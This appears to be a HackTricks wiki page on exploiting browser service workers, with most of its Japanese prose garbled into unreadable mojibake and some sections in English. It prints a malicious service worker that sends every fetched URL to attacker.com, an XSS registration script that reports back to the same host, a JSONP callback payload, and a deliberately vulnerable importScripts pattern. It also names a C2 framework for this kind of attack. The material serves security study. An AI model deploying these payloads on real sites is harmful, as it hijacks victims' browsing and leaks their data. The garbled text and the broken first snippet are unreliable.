# ã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼ã®æ‚ªç”¨



{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

**ã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼**ã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ã«ã‚ˆã£ã¦ãƒãƒƒã‚¯ã‚°ãƒ©ã‚¦ãƒ³ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã€ä»»æ„ã®ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã¨ã¯åˆ¥ã«å‹•ä½œã—ã€ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ“ä½œã‚’å¿…è¦ã¨ã—ãªã„æ©Ÿèƒ½ã‚’æœ‰åŠ¹ã«ã—ã€**ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ãŠã‚ˆã³ãƒãƒƒã‚¯ã‚°ãƒ©ã‚¦ãƒ³ãƒ‰å‡¦ç†**ã®èƒ½åŠ›ã‚’å‘ä¸Šã•ã›ã¾ã™ã€‚ã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯[ã“ã¡ã‚‰](https://developers.google.com/web/fundamentals/primers/service-workers)ã§ç¢ºèªã§ãã¾ã™ã€‚è„†å¼±ãªã‚¦ã‚§ãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã§ã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ãã®ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®ã™ã¹ã¦ã®ãƒšãƒ¼ã‚¸ã«å¯¾ã™ã‚‹è¢«å®³è€…ã®æ“ä½œã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚


### æ—¢å­˜ã®ã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼ã®ç¢ºèª

æ—¢å­˜ã®ã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼ã¯ã€**é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«**ã®**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³**ã‚¿ãƒ–ã®**ã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼**ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ç¢ºèªã§ãã¾ã™ã€‚åˆ¥ã®æ–¹æ³•ã¨ã—ã¦ã€[chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals)ã‚’è¨ªã‚Œã‚‹ã“ã¨ã§ã€ã‚ˆã‚Šè©³ç´°ãªãƒ“ãƒ¥ãƒ¼ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒ—ãƒƒã‚·ãƒ¥é€šçŸ¥

**ãƒ—ãƒƒã‚·ãƒ¥é€šçŸ¥ã®æ¨©é™**ã¯ã€**ã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼**ãŒç›´æ¥ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ“ä½œãªã—ã«ã‚µãƒ¼ãƒãƒ¼ã¨é€šä¿¡ã™ã‚‹èƒ½åŠ›ã«ç›´æ¥å½±éŸ¿ã—ã¾ã™ã€‚æ¨©é™ãŒæ‹’å¦ã•ã‚Œã‚‹ã¨ã€ã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼ãŒç¶™ç¶šçš„ãªè„…å¨ã‚’ã‚‚ãŸã‚‰ã™å¯èƒ½æ€§ãŒåˆ¶é™ã•ã‚Œã¾ã™ã€‚é€†ã«ã€æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã¨ã€æ½œåœ¨çš„ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®å—ä¿¡ã¨å®Ÿè¡Œã‚’å¯èƒ½ã«ã™ã‚‹ã“ã¨ã§ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ãŒå¢—åŠ ã—ã¾ã™ã€‚

## ã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼ã‚’ä½œæˆã™ã‚‹æ”»æ’ƒ

ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚‚ã®ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š

* ã‚µãƒ¼ãƒãƒ¼ã«**ä»»æ„ã®JS**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã™ã‚‹æ–¹æ³•ã¨ã€ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ãŸJSãƒ•ã‚¡ã‚¤ãƒ«ã®**ã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼ã‚’èª­ã¿è¾¼ã‚€ãŸã‚ã®XSS**
* **å‡ºåŠ›ã‚’æ“ä½œã§ãã‚‹**ï¼ˆä»»æ„ã®JSã‚³ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ï¼‰**è„†å¼±ãªJSONPãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã¨ã€**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æŒã¤JSONPã‚’èª­ã¿è¾¼ã‚€ãŸã‚ã®XSS**ãŒå¿…è¦ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**æ‚ªæ„ã®ã‚ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼ã‚’èª­ã¿è¾¼ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚

æ¬¡ã®ä¾‹ã§ã¯ã€`fetch`ã‚¤ãƒ™ãƒ³ãƒˆã‚’ãƒªãƒƒã‚¹ãƒ³ã—ã€**æ”»æ’ƒè€…ã®ã‚µãƒ¼ãƒãƒ¼ã«å„å–å¾—URLã‚’é€ä¿¡ã™ã‚‹**æ–°ã—ã„ã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼ã‚’**ç™»éŒ²ã™ã‚‹ãŸã‚ã®ã‚³ãƒ¼ãƒ‰**ã‚’ç¤ºã—ã¾ã™ï¼ˆã“ã‚Œã¯**ã‚µãƒ¼ãƒãƒ¼**ã«**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã™ã‚‹ã‹ã€**è„†å¼±ãªJSONP**ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’ä»‹ã—ã¦èª­ã¿è¾¼ã‚€å¿…è¦ãŒã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã§ã™ï¼‰ï¼š
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
ãã—ã¦ã€ã“ã‚Œã¯**ãƒ¯ãƒ¼ã‚«ãƒ¼ã‚’ç™»éŒ²ã™ã‚‹**ãŸã‚ã®ã‚³ãƒ¼ãƒ‰ã§ã™ï¼ˆ**XSS**ã‚’æ‚ªç”¨ã—ã¦å®Ÿè¡Œã§ãã‚‹ã¯ãšã®ã‚³ãƒ¼ãƒ‰ã§ã™ï¼‰ã€‚ã“ã®å ´åˆã€**æ”»æ’ƒè€…**ã®ã‚µãƒ¼ãƒãƒ¼ã«**ç™»éŒ²**ãŒæˆåŠŸã—ãŸã‹ã©ã†ã‹ã‚’**é€šçŸ¥ã™ã‚‹**ãŸã‚ã®**GET**ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã¾ã™ï¼š
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
JSONPã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹å ´åˆã¯ã€å€¤ã‚’ `var sw` ã®ä¸­ã«å…¥ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
There is a **C2** dedicated to the **exploitation of Service Workers** called [**Shadow Workers**](https://shadow-workers.github.io) that will be very useful to abuse these vulnerabilities.

The **24-hour cache directive** limits the life of a malicious or compromised **service worker (SW)** to at most 24 hours after an XSS vulnerability fix, assuming online client status. To minimize vulnerability, site operators can lower the SW script's Time-To-Live (TTL). Developers are also advised to create a [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) for rapid deactivation.

## Abusing `importScripts` in a SW via DOM Clobbering

The function **`importScripts`** called from a Service Worker can **import a script from a different domain**. If this function is called using a **parameter that an attacker could** modify he would be able to **import a JS script from his domain** and get XSS.

**This even bypasses CSP protections.**

**Example vulnerable code:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### DOMã‚¯ãƒ©ãƒƒã‚­ãƒ³ã‚°ã‚’ä½¿ç”¨ã—ã¦

DOMã‚¯ãƒ©ãƒƒã‚­ãƒ³ã‚°ãŒä½•ã§ã‚ã‚‹ã‹ã®è©³ç´°ã«ã¤ã„ã¦ã¯ã€æ¬¡ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

SWãŒ**`importScripts`**ã‚’å‘¼ã³å‡ºã™ãŸã‚ã«ä½¿ç”¨ã—ã¦ã„ã‚‹URL/ãƒ‰ãƒ¡ã‚¤ãƒ³ãŒ**HTMLè¦ç´ å†…ã«ã‚ã‚‹å ´åˆ**ã€ãã‚Œã‚’**DOMã‚¯ãƒ©ãƒƒã‚­ãƒ³ã‚°ã‚’ä»‹ã—ã¦å¤‰æ›´ã™ã‚‹ã“ã¨ãŒå¯èƒ½**ã§ã‚ã‚Šã€SWãŒ**è‡ªåˆ†ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã‹ã‚‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’èª­ã¿è¾¼ã‚€**ã‚ˆã†ã«ã§ãã¾ã™ã€‚

ã“ã®ä¾‹ã«ã¤ã„ã¦ã¯ã€å‚ç…§ãƒªãƒ³ã‚¯ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
